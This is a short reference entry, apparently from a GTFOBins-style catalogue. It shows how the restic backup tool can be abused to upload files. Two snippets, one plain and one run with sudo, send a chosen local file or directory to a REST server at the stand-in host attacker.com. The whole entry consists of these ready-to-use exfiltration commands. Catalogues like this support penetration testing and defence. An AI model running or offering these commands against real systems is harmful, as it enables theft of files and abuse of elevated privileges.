file-upload.code:
RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"

sudo.code:
RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
